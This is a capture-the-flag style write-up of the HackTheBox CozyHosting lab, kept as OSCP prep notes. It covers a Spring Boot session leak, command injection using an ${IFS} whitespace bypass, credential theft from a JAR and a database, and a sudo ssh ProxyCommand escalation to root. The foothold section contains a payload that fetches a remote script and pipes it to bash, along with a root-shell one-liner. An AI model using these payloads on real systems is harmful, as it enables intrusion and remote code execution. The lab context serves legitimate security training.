+++
date = '2026-05-15T00:00:00-03:00'
draft = false
title = 'HTB: CozyHosting - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'spring-boot', 'command-injection', 'ifs-bypass', 'jar', 'postgresql', 'gtfobins', 'ssh']
description = 'Write-up for HackTheBox CozyHosting - leaking a Spring Boot session via an exposed actuator endpoint, bypassing whitespace filtering with ${IFS} for RCE, and escaping to root through a GTFOBins SSH ProxyCommand trick.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-CozyHosting/cover.png'
+++

Error pages usually get ignored. On CozyHosting, the /error page is what gives the whole game away.

## Machine info

| | |
|---|---|
| **Name** | CozyHosting |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- A Spring Boot Whitelabel Error page reveals the framework; a targeted wordlist uncovers `/actuator/sessions` leaking a valid session token
- Cookie swap into `/admin` exposes an SSH connection form; the username field is injectable but blocks spaces - bypassed with `${IFS}`
- Shell lands as `app`, a `.jar` in `/app` contains `application.properties` with PostgreSQL credentials
- Crack the bcrypt admin hash with John, `su josh`, find `sudo /usr/bin/ssh *`, and GTFOBins the ProxyCommand to root

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A cozyhosting.htb
```

![Nmap results](/images/htb-CozyHosting/nmap.png)

Ports 22 (SSH) and 80 (HTTP). The nmap output calls out OpenSSH 8.9p1 and nginx 1.18.0 - Ubuntu box.

---

## Enumeration

### Directory brute force

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![Gobuster initial](/images/htb-CozyHosting/gobuster-initial.png)

Found login, index, admin (redirects), and error. The main page looks like a standard hosting product site.

![Website](/images/htb-CozyHosting/website.png)

### The error page clue

Navigating to `/error` shows something that looks useless at first glance - a "Whitelabel Error Page."

![Whitelabel error](/images/htb-CozyHosting/whitelabel-error.png)

This is not a custom error page. Whitelabel is the default, unstyled error response from **Spring Boot** when no explicit mapping exists.

![Whitelabel Google](/images/htb-CozyHosting/whitelabel-google.png)

Knowing we are dealing with Spring Boot opens a whole new angle: Spring Actuator endpoints. I grabbed a Spring Boot-specific wordlist and re-enumerated.

```bash
gobuster dir -u http://cozyhosting.htb -w spring-boot.txt
```

![Gobuster Spring Boot](/images/htb-CozyHosting/gobuster-springboot.png)

Several actuator endpoints show up. The interesting one is `/actuator/sessions`.

### Session leak via /actuator/sessions

![Actuator sessions](/images/htb-CozyHosting/actuator-sessions.png)

The endpoint dumps active session IDs mapped to usernames. There are entries for `kanderson`. I grabbed one of the valid (non-UNAUTHORIZED) tokens, swapped it into my cookie, and navigated to `/admin`.

![Admin dashboard](/images/htb-CozyHosting/admin-dashboard.png)

In as K. Anderson. The dashboard has an "Include host into automatic patching" form with Hostname and Username fields.

---

## Foothold

### Command injection via SSH form

The form submits an SSH connection. That Username field is almost certainly passed to an `ssh` command on the backend - classic injection candidate.

![SSH form](/images/htb-CozyHosting/ssh-form.png)

I tried a basic RCE test - the app rejected it:

![RCE whitespace fail](/images/htb-CozyHosting/rce-whitespace-fail.png)

"Username can't contain whitespaces!" - the filter strips spaces. But it doesn't know about `${IFS}`.

**Why `${IFS}` works:** In bash, `$IFS` (Internal Field Separator) is a special variable whose default value is a space/tab/newline. When you write `${IFS}` in a payload, the web app sees a variable expansion - not a literal space - so it passes the filter. Once the server evaluates the string in a shell context, bash expands `${IFS}` into a real space and the command runs normally.

First I confirmed RCE with a ping:

```
admin;ping${IFS}10.10.14.208;
```

![Tcpdump ping](/images/htb-CozyHosting/tcpdump-ping.png)

ICMP packets hit my listener - code execution confirmed. I created a simple reverse shell script:

![Reverse shell script](/images/htb-CozyHosting/reverse-shell-script.png)

Served it with `python3 -m http.server 80` and used this payload in the Username field:

![RCE IFS payload](/images/htb-CozyHosting/rce-ifs-payload.png)

```
admin;curl${IFS}http://10.10.14.208/s.sh|bash;
```

![Shell as app](/images/htb-CozyHosting/shell-app.png)

Shell as `app@cozyhosting`.

### Extracting credentials from the JAR

The `/app` directory holds one file:

![JAR listing](/images/htb-CozyHosting/jar-listing.png)

`cloudhosting-0.0.1.jar`. A JAR is just a ZIP - I uploaded it to Kali and unzipped it:

![JAR upload](/images/htb-CozyHosting/jar-upload.png)

![JAR unzip](/images/htb-CozyHosting/jar-unzip.png)

![JAR contents](/images/htb-CozyHosting/jar-contents.png)

Inside `BOOT-INF/classes/application.properties`:

![Application properties](/images/htb-CozyHosting/application-properties.png)

PostgreSQL credentials: `postgres` / `Vg6nvzAQ7XxR`.

### PostgreSQL - user hashes

```bash
psql -h 127.0.0.1 -U postgres -d cozyhosting -W
```

![PostgreSQL users](/images/htb-CozyHosting/postgres-users.png)

The `users` table has two bcrypt hashes. The admin hash is the target.

---

## Privilege Escalation

### Hash cracking

Saved the admin hash and cracked it with John + rockyou:

![Hash file](/images/htb-CozyHosting/hash-file.png)

![John cracked](/images/htb-CozyHosting/john-cracked.png)

Password: **manchesterunited**.

### Lateral move to josh

Upgraded the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`, then:

![su josh](/images/htb-CozyHosting/su-josh.png)

### GTFOBins - SSH ProxyCommand

```bash
sudo -l
```

![sudo -l](/images/htb-CozyHosting/sudo-l.png)

Josh can run `/usr/bin/ssh *` as root. GTFOBins has the move:

```bash
sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

![Root shell](/images/htb-CozyHosting/root-shell.png)

`ProxyCommand` tells ssh to run an arbitrary command before connecting. Since we invoke ssh as root via sudo, the shell spawned by ProxyCommand inherits root. The `0<&2 1>&2` redirect ties stdin to stderr and stdout to stderr, giving a usable interactive terminal.

**Root.**

---

## Takeaways

- **Error pages are informational, not cosmetic.** Whitelabel means Spring Boot, which means actuator endpoints, which means potentially exposed sessions, env vars, or health data - always investigate framework-specific paths.
- **`${IFS}` is a reliable whitespace bypass.** Any blacklist that strips spaces but allows dollar signs and braces is vulnerable. Keep it in your injection toolkit.
- **JARs are ZIPs.** When you land on a Java app, unzip the JAR and check `application.properties` for hardcoded credentials.
- **`sudo /usr/bin/ssh *` means root.** The ProxyCommand GTFOBins technique is clean and requires no exploit code.

## References

- [HackTheBox - CozyHosting](https://app.hackthebox.com/machines/CozyHosting)
- [Spring Boot Actuator wordlist](https://github.com/emadshanab/DIR-WORDLISTS/blob/main/spring-boot.txt)
- [GTFOBins - ssh](https://gtfobins.github.io/gtfobins/ssh/)
- Lain Kusanagi list (OSCP prep)
